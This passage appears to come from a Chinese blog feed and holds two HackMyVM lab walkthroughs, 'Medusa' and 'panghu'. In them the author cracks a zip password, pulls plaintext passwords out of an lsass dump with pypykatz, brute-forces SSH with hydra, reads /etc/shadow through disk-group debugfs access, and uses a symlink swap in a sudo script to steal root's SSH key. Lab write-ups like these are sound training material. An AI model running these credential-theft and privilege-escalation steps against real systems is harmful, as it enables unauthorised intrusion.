7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024

  
Enter password (will not be echoed):
ERROR: Wrong password : lsass.DMP


Sub items Errors: 1


Break signaled
```

爆破一下

```
┌──(kali㉿kali)-[~/test]
└─$ zip2john old_files.zip &gt; hash                       
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 512/512 AVX512BW 16x])
No password hashes left to crack (see FAQ)
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ john --show hash                                    

old_files.zip/lsass.DMP:medusa666:lsass.DMP:old_files.zip:old_files.zip

1 password hash cracked, 0 left
                            
┌──(kali㉿kali)-[~/test]
└─$ 7z x old_files.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 12387024 bytes (12 MiB)

Extracting archive: old_files.zip
--
Path = old_files.zip
Type = zip
Physical Size = 12387024

  
Would you like to replace the existing file:
  Path:     ./lsass.DMP
  Size:     0 bytes
  Modified: 2023-01-17 22:12:41
with the file from archive:
  Path:     lsass.DMP
  Size:     34804383 bytes (34 MiB)
  Modified: 2023-01-17 22:12:41
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y      

              
Enter password (will not be echoed):
Everything is Ok

Size:       34804383
Compressed: 12387024
                                         
┌──(kali㉿kali)-[~/test]
└─$ file lsass.DMP
lsass.DMP: Mini DuMP crash report, 12 streams, Tue Jan 17 14:08:32 2023, 0x1826 type
```

参考链接：https://technicalnavigator.in/how-to-extract-information-from-dmp-files/

```
┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP                
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 2261421 (2281ad)
session_id 18
username avijneyam
domainname Medusa-PC
logon_server MEDUSA-PC
logon_time 2023-01-17T14:05:20.008398+00:00
sid S-1-5-21-1556941724-2101079873-2087351601-1016
luid 2261421

省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 省略 


                   
```

提取一下

```
┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP | grep 'username'

INFO:pypykatz:Parsing file lsass.DMP
username avijneyam
                username avijneyam
                username avijneyam
                username avijneyam
username shelldredd
                username shelldredd
                username shelldredd
                username shelldredd
username powerful
                username powerful
                username powerful
                username powerful
username alienum
                username alienum
                username alienum
                username alienum
username Claor
                username Claor
                username Claor
                username Claor
username Pr0xy
                username Pr0xy
                username Pr0xy
                username Pr0xy
username nolo
                username nolo
                username nolo
                username nolo
username numero6
                username numero6
                username numero6
                username numero6
username ct0l4
                username ct0l4
                username ct0l4
                username ct0l4
username LordP4
                username LordP4
                username LordP4
                username LordP4
username sml
                username sml
                username sml
                username sml
username spectre
                username spectre
                username spectre
                username spectre
username RiJaba1
                username RiJaba1
                username RiJaba1
                username RiJaba1
username jabatron
                username jabatron
                username jabatron
                username jabatron
username InfayerTS
                username InfayerTS
                username InfayerTS
                username InfayerTS
username d4t4s3c
                username d4t4s3c
                username d4t4s3c
                username d4t4s3c
username cromiphi
                username cromiphi
                username cromiphi
                username cromiphi
username Medusa
                username Medusa
                username Medusa
                username Medusa
username Medusa
                username Medusa
                username Medusa
                username Medusa
username ANONYMOUS LOGON
username SERVICIO LOCAL
username MEDUSA-PC$
                username MEDUSA-PC$
                username MEDUSA-PC$
username 
username MEDUSA-PC$
                username MEDUSA-PC$
                username MEDUSA-PC$
                                                                                        

┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP | grep 'username'|awk -F ' ' '{print $2}'|sort | uniq
INFO:pypykatz:Parsing file lsass.DMP

alienum
ANONYMOUS
avijneyam
Claor
cromiphi
ct0l4
d4t4s3c
InfayerTS
jabatron
LordP4
Medusa
MEDUSA-PC$
nolo
numero6
powerful
Pr0xy
RiJaba1
SERVICIO
shelldredd
sml
spectre
               
┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP | grep 'password' 
INFO:pypykatz:Parsing file lsass.DMP
                password 4v1jn3y4m_zxc
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password 4v1jn3y4m_zxc
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password 4v1jn3y4m_zxc
                password (hex)3400760031006a006e003300790034006d005f007a0078006300000000000000
                password t0p_s3cr3t
                password (hex)7400300070005f0073003300630072003300740000000000
                password (hex)7400300070005f0073003300630072003300740000000000
                password t0p_s3cr3t
                password (hex)7400300070005f0073003300630072003300740000000000
                password t0p_s3cr3t
                password (hex)7400300070005f0073003300630072003300740000000000
                password p0w3rf1ll_abc
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password p0w3rf1ll_abc
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password p0w3rf1ll_abc
                password (hex)70003000770033007200660031006c006c005f00610062006300000000000000
                password 4l13num_qwerty
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password 4l13num_qwerty
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password 4l13num_qwerty
                password (hex)34006c00310033006e0075006d005f0071007700650072007400790000000000
                password n0s_v0lv1m0s_4_1lusi0n4r
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password n0s_v0lv1m0s_4_1lusi0n4r
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password n0s_v0lv1m0s_4_1lusi0n4r
                password (hex)6e00300073005f00760030006c00760031006d00300073005f0034005f0031006c0075007300690030006e0034007200
                password pr0xy_ch41ns_456
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password pr0xy_ch41ns_456
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password pr0xy_ch41ns_456
                password (hex)700072003000780079005f0063006800340031006e0073005f00340035003600
                password littl3_h4ck3r
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password littl3_h4ck3r
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password littl3_h4ck3r
                password (hex)6c006900740074006c0033005f006800340063006b0033007200000000000000
                password n1mb3r_s1x
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password n1mb3r_s1x
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password n1mb3r_s1x
                password (hex)6e0031006d006200330072005f0073003100780000000000
                password b4ck3nd_pr0gr4m3r
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password b4ck3nd_pr0gr4m3r
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password b4ck3nd_pr0gr4m3r
                password (hex)6200340063006b0033006e0064005f007000720030006700720034006d0033007200000000000000
                password Wh1t3_h4ck
                password (hex)570068003100740033005f006800340063006b0000000000
                password (hex)570068003100740033005f006800340063006b0000000000
                password Wh1t3_h4ck
                password (hex)570068003100740033005f006800340063006b0000000000
                password Wh1t3_h4ck
                password (hex)570068003100740033005f006800340063006b0000000000
                password th3_b0ss
                password (hex)7400680033005f006200300073007300
                password (hex)7400680033005f006200300073007300
                password th3_b0ss
                password (hex)7400680033005f006200300073007300
                password th3_b0ss
                password (hex)7400680033005f006200300073007300
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password 5p3ctr3_p0is0n_xX
                password (hex)35007000330063007400720033005f00700030006900730030006e005f0078005800000000000000
                password littl3_h4ck3r_v2
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password littl3_h4ck3r_v2
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password littl3_h4ck3r_v2
                password (hex)6c006900740074006c0033005f006800340063006b00330072005f0076003200
                password b1zum_3_AM
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password b1zum_3_AM
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password b1zum_3_AM
                password (hex)620031007a0075006d005f0033005f0041004d0000000000
                password UnD3sc0n0c1d0
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password UnD3sc0n0c1d0
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password UnD3sc0n0c1d0
                password (hex)55006e00440033007300630030006e0030006300310064003000000000000000
                password br4in_br34k3r
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password br4in_br34k3r
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password br4in_br34k3r
                password (hex)62007200340069006e005f0062007200330034006b0033007200000000000000
                password br4in_br34k3r_v2
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password br4in_br34k3r_v2
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password br4in_br34k3r_v2
                password (hex)62007200340069006e005f0062007200330034006b00330072005f0076003200
                password 123456
                password (hex)31003200330034003500360000000000
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password 123456
                password (hex)31003200330034003500360000000000
                password None
                password (hex)
                password None
                password (hex)
                password None
                password (hex)
                password None
                password (hex)
                                                               

┌──(kali㉿kali)-[~/test]
└─$ pypykatz lsa minidump lsass.DMP | grep 'password'|awk '!/hex/'|awk -F ' ' '{print $2}'| sort | uniq
INFO:pypykatz:Parsing file lsass.DMP
123456
4l13num_qwerty
4v1jn3y4m_zxc
5p3ctr3_p0is0n_xX
b1zum_3_AM
b4ck3nd_pr0gr4m3r
br4in_br34k3r
br4in_br34k3r_v2
littl3_h4ck3r
littl3_h4ck3r_v2
n0s_v0lv1m0s_4_1lusi0n4r
n1mb3r_s1x
None
p0w3rf1ll_abc
pr0xy_ch41ns_456
t0p_s3cr3t
th3_b0ss
UnD3sc0n0c1d0
Wh1t3_h4ck
```

汇总一下

```
┌──(kali㉿kali)-[~/test]
└─$ cat user
alienum
ANONYMOUS
avijneyam
Claor
cromiphi
ct0l4
d4t4s3c
InfayerTS
jabatron
LordP4
Medusa
MEDUSA-PC$
nolo
numero6
powerful
Pr0xy
RiJaba1
SERVICIO
shelldredd
sml
spectre
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat pass  
123456
4l13num_qwerty
4v1jn3y4m_zxc
5p3ctr3_p0is0n_xX
b1zum_3_AM
b4ck3nd_pr0gr4m3r
br4in_br34k3r
br4in_br34k3r_v2
littl3_h4ck3r
littl3_h4ck3r_v2
n0s_v0lv1m0s_4_1lusi0n4r
n1mb3r_s1x
None
p0w3rf1ll_abc
pr0xy_ch41ns_456
t0p_s3cr3t
th3_b0ss
UnD3sc0n0c1d0
Wh1t3_h4ck
          
```

但是我们用户刚刚看只有spectre，所以我们先尝试爆破spectre先

```
┌──(kali㉿kali)-[~/test]
└─$ hydra -l spectre -P pass ssh://192.168.205.145 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-04 18:33:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 22 tasks per 1 server, overall 22 tasks, 22 login tries (l:1/p:22), ~1 try per task
[DATA] attacking ssh://192.168.205.145:22/
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'spectre' - 1 of 22 [child 0] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '' - 2 of 22 [child 1] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'ertceps' - 3 of 22 [child 2] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '123456' - 4 of 22 [child 3] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '4l13num_qwerty' - 5 of 22 [child 4] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '4v1jn3y4m_zxc' - 6 of 22 [child 5] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass '5p3ctr3_p0is0n_xX' - 7 of 22 [child 6] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'b1zum_3_AM' - 8 of 22 [child 7] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'b4ck3nd_pr0gr4m3r' - 9 of 22 [child 8] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'br4in_br34k3r' - 10 of 22 [child 9] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'br4in_br34k3r_v2' - 11 of 22 [child 10] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'littl3_h4ck3r' - 12 of 22 [child 11] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'littl3_h4ck3r_v2' - 13 of 22 [child 12] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'n0s_v0lv1m0s_4_1lusi0n4r' - 14 of 22 [child 13] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'n1mb3r_s1x' - 15 of 22 [child 14] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'None' - 16 of 22 [child 15] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'p0w3rf1ll_abc' - 17 of 22 [child 16] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'pr0xy_ch41ns_456' - 18 of 22 [child 17] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 't0p_s3cr3t' - 19 of 22 [child 18] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'th3_b0ss' - 20 of 22 [child 19] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'UnD3sc0n0c1d0' - 21 of 22 [child 20] (0/0)
[ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'Wh1t3_h4ck' - 22 of 22 [child 21] (0/0)
[REDO-ATTEMPT] target 192.168.205.145 - login 'spectre' - pass 'br4in_br34k3r_v2' - 23 of 27 [child 1] (1/5)
[22][ssh] host: 192.168.205.145   login: spectre   password: 5p3ctr3_p0is0n_xX
[STATUS] attack finished for 192.168.205.145 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-04 18:33:20
```

登录

```
www-data@medusa:/...$ ls /home/
spectre
www-data@medusa:/...$ su - spectre
Password: 
spectre@medusa:~$ id
uid=1000(spectre) gid=1000(spectre) groups=1000(spectre),6(disk),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

disk我记得好像可以提权

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group

```
#查看系统分区和文件系统信息
df -h
#使用debugfs查看文件
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
spectre@medusa:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       6.9G  2.1G  4.5G  32% /
udev            471M     0  471M   0% /dev
tmpfs           489M     0  489M   0% /dev/shm
tmpfs            98M  504K   98M   1% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs            98M     0   98M   0% /run/user/1000
spectre@medusa:~$ debugfs /dev/sda1
-bash: debugfs: command not found
spectre@medusa:~$ which debugfs
spectre@medusa:~$ find / -name debugfs 2&gt;/dev/null
/usr/sbin/debugfs
spectre@medusa:~$ /usr/sbin/debugfs /dev/sda1
debugfs 1.46.2 (28-Feb-2021)
debugfs:  cat /root/.ssh/id_rsa
/root/.ssh/id_rsa: File not found by ext2_lookup 
debugfs:  cat /etc/shadow
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
daemon:*:19372:0:99999:7:::
bin:*:19372:0:99999:7:::
sys:*:19372:0:99999:7:::
sync:*:19372:0:99999:7:::
games:*:19372:0:99999:7:::
man:*:19372:0:99999:7:::
lp:*:19372:0:99999:7:::
mail:*:19372:0:99999:7:::
news:*:19372:0:99999:7:::
uucp:*:19372:0:99999:7:::
proxy:*:19372:0:99999:7:::
www-data:*:19372:0:99999:7:::
backup:*:19372:0:99999:7:::
list:*:19372:0:99999:7:::
irc:*:19372:0:99999:7:::
gnats:*:19372:0:99999:7:::
nobody:*:19372:0:99999:7:::
_apt:*:19372:0:99999:7:::
systemd-network:*:19372:0:99999:7:::
systemd-resolve:*:19372:0:99999:7:::
messagebus:*:19372:0:99999:7:::
systemd-timesync:*:19372:0:99999:7:::
sshd:*:19372:0:99999:7:::
spectre:$y$j9T$4TeFHbjRqRC9royagYTTJ/$KnU7QK1u0/5fpHHqE/ehPe6uqpwbs6vuvcQQH4EF9ZB:19374:0:99999:7:::
systemd-coredump:!*:19372::::::
ftp:*:19372:0:99999:7:::
```

拿去爆破

```
┌──(kali㉿kali)-[~/test]
└─$ echo 'root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::' &gt; hash
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
andromeda        (root)   
1g 0:00:00:06 DONE (2025-02-04 18:39) 0.1455g/s 544.9p/s 544.9c/s 544.9C/s 19871987..street
Use the '--show' option to display all of the cracked passwords reliably
Session completed. 
                 
```

登录

```
debugfs:  exit
debugfs: Unknown request 'exit'.  Type '?' for a request list.
debugfs:  
debugfs:  quit
spectre@medusa:~$ su -
Password: 
root@medusa:~# id
uid=0(root) gid=0(root) groups=0(root)
```


&lt;!-- ##{'timestamp':1738666533}## --&gt;sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Medusa.html</guid><pubDate>Tue, 04 Feb 2025 10:55:33 +0000</pubDate></item><item><title>panghu</title><link>https://7r1UMPHK.github.io/post/panghu.html</link><description>裙u的提权题

![image-20250331190451295](https://7r1umphk.github.io/image/20250331190451337.png)

```
┌──(kali㉿kali)-[~/test]
└─$ sudo arp-scan -l     
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:64:60:b9, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.147 08:00:27:86:a6:d2       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:6e:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.975 seconds (129.62 hosts/sec). 4 responded
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ ssh ssh@192.168.205.147
The authenticity of host '192.168.205.147 (192.168.205.147)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
    ~/.ssh/known_hosts:8: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.147' (ED25519) to the list of known hosts.
ssh@192.168.205.147's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~$ sudo -l
[sudo] password for ssh: 
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User ssh may run the following commands on jan:
    (root) PASSWD: /opt/lzh.sh
jan:~$ cat /opt/lzh.sh 
#!/bin/sh

cd /home/ssh
cat backup/hi
jan:~$ cd /home/ssh/backup/
jan:~/backup$ ls -al
total 12
drwxr-xr-x    2 root     root          4096 Feb  3 23:28 .
drwxr-sr-x    3 ssh      ssh           4096 Feb  3 23:27 ..
-rw-------    1 root     root             9 Feb  3 23:28 hi
```

可以看到我们是有权限改目录的，但是不能删除

```
jan:~/backup$ cd ..
jan:~$ ls -la
total 12
drwxr-sr-x    3 ssh      ssh           4096 Feb  3 23:27 .
drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -&gt; /dev/null
drwxr-xr-x    2 root     root          4096 Feb  3 23:28 backup
jan:~$ mv backup/ backup1
jan:~$ mkdir backup
jan:~$ cd backup
jan:~$ cd backup
jan:~/backup$ ln -s /root/root.txt hi
jan:~/backup$ sudo /opt/lzh.sh 
flag{LingMj}
```

然后我就去读取密钥和shadow了，我以为没有id_rsa就是没有密钥，我就没看，哪知道

![image-20250331190502904](https://7r1umphk.github.io/image/20250331190503009.png)

haha我真傻

```
jan:~/backup$ rm hi 
jan:~/backup$ sudo /opt/lzh.sh 
#       $OpenBSD: sshd_config,v 1.104 2021/07/02 05:11:21 dtucker Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

# Include configuration snippets before processing this file to allow the
# snippets to override directives set in this file.
Include /etc/ssh/sshd_config.d/*.conf

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin yes
strictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile      ~/.ssh/authorized_keys

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to no to disable s/key passwords
#KbdInteractiveAuthentication yes

# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the KbdInteractiveAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via KbdInteractiveAuthentication may bypass
# the setting of 'PermitRootLogin prohibit-password'.
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and KbdInteractiveAuthentication to 'no'.
#UsePAM no

#AllowAgentForwarding yes
# Feel free to re-enable these if your use case requires them.
AllowTcpForwarding no
GatewayPorts no
X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# override default of no subsystems
Subsystem       sftp    internal-sftp

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
jan:~/backup$ rm hi 
jan:~/backup$ ln -s /root/.ssh/id_ed25519 hi
jan:~/backup$ sudo -l
[sudo] password for ssh: 
Matching Defaults entries for ssh on jan:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for ssh:
    Defaults!/usr/sbin/visudo env_keep+='SUDO_EDITOR EDITOR VISUAL'

User ssh may run the following commands on jan:
    (root) PASSWD: /opt/lzh.sh
jan:~/backup$ sudo /opt/lzh.sh
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjgAAAJB2iiMQdooj
EAAAAAtzc2gtZWQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjg
AAAEAUhlfWSQ4VtYPAVaPWXTsnbEFiir93k1A3Icbge7uj5oCCTv9WGP1Puf9NX55DiJwe
YnL8z4mnTt6s36lxTDOOAAAACHJvb3RAamFuAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
jan:~/backup$ nano id
jan:~/backup$ cat id 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjgAAAJB2iiMQdooj
EAAAAAtzc2gtZWQyNTUxOQAAACCAgk7/Vhj9T7n/TV+eQ4icHmJy/M+Jp07erN+pcUwzjg
AAAEAUhlfWSQ4VtYPAVaPWXTsnbEFiir93k1A3Icbge7uj5oCCTv9WGP1Puf9NX55DiJwe
YnL8z4mnTt6s36lxTDOOAAAACHJvb3RAamFuAQIDBAU=
-----END OPENSSH PRIVATE KEY-----
jan:~/backup$ chmod 600 id 
jan:~/backup$ ssh -i id root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:tkz/GarJpLwrGFZmgpweGf70u9znUcXycaHKGhfPRCc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See &lt;https://wiki.alpinelinux.org/&gt;.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

jan:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

